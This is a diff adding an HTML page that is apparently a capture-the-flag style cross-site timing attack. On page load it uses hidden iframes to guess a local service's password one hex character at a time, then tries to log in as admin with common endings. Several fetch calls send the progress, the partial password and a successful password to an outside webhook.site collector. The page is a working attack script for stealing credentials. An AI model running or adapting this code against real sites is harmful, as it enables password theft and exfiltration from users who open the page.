@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head><title>Minimal Fast Attack</title></head>
+<body>
+<h1>MINIMAL timing attack - single measurement</h1>
+<pre id="output"></pre>
+<div id="container" style="position:absolute;left:-9999px;"></div>
+<script>
+const output = document.getElementById('output');
+const container = document.getElementById('container');
+const TARGET = 'https://127.0.0.1:9999/';
+const CHARSET = '0123456789abcdef';
+let knownPassword = 'lebah';
+
+function log(msg) {
+    output.textContent += msg + '\n';
+    console.log(msg);
+}
+
+// SINGLE fast measurement
+async function quickTest(pass) {
+    return new Promise((resolve) => {
+        const start = performance.now();
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
+        
+        let resolved = false;
+        
+        const cleanup = () => {
+            if (iframe.parentNode) container.removeChild(iframe);
+        };
+        
+        // VERY aggressive timeout
+        const timeout = setTimeout(() => {
+            if (!resolved) {
+                const elapsed = performance.now() - start;
+                cleanup();
+                resolved = true;
+                resolve({ pass, elapsed, timeout: true });
+            }
+        }, 400); // Only 400ms!
+        
+        iframe.onload = () => {
+            if (!resolved) {
+                const elapsed = performance.now() - start;
+                clearTimeout(timeout);
+                cleanup();
+                resolved = true;
+                resolve({ pass, elapsed, timeout: false });
+            }
+        };
+        
+        iframe.onerror = () => {
+            if (!resolved) {
+                const elapsed = performance.now() - start;
+                clearTimeout(timeout);
+                cleanup();
+                resolved = true;
+                resolve({ pass, elapsed, timeout: false });
+            }
+        };
+        
+        container.appendChild(iframe);
+    });
+}
+
+async function leakPassword() {
+    log('[*] MINIMAL fast attack - 400ms timeout per test');
+    log('[*] Known prefix: ' + knownPassword);
+    
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=minimal_started').catch(e=>{});
+    
+    // Leak up to 6 chars (to fit in time)
+    for (let pos = 0; pos < 6; pos++) {
+        log(`\n[*] Position ${pos+1}/6...`);
+        let bestChar = '0';
+        let maxTime = 0;
+        
+        // Test all 16 chars quickly
+        for (let c of CHARSET) {
+            const candidate = knownPassword + c;
+            const result = await quickTest(candidate);
+            
+            log(`  ${c}: ${result.elapsed.toFixed(0)}ms${result.timeout ? ' (timeout)' : ''}`);
+            
+            // Take the slowest one as match
+            if (result.elapsed > maxTime) {
+                maxTime = result.elapsed;
+                bestChar = c;
+            }
+        }
+        
+        knownPassword += bestChar;
+        log(`  -> BEST: '${bestChar}' (${maxTime.toFixed(0)}ms)`);
+        log(`  -> Current: ${knownPassword}`);
+        
+        // Send progress
+        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
+    }
+    
+    log('\n========================================');
+    log('PARTIAL PASSWORD (6 chars): ' + knownPassword);
+    log('========================================');
+    
+    // Try to complete with common patterns
+    const commonEndings = ['000000', 'ffffff', 'aaaaaa', '123456', 'abcdef', '000001'];
+    
+    log('\n[*] Testing common 6-char endings...');
+    for (let ending of commonEndings) {
+        const fullPass = knownPassword + ending;
+        log(`Testing: ${fullPass}`);
+        
+        try {
+            const response = await fetch(TARGET + 'login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `username=admin&password=${encodeURIComponent(fullPass)}`,
+                credentials: 'include'
+            });
+            
+            if (response.redirected || !response.url.includes('login')) {
+                log(`\n🎉 SUCCESS! Password: ${fullPass}`);
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?SUCCESS=' + encodeURIComponent(fullPass)).catch(e=>{});
+                return;
+            }
+        } catch (e) {
+            log(`Error testing ${fullPass}: ${e.message}`);
+        }
+    }
+    
+    // Final exfiltration of partial result
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?partial=' + encodeURIComponent(knownPassword)).catch(e=>{});
+}
+
+setTimeout(leakPassword, 200);
+</script>
+</body>
+</html>
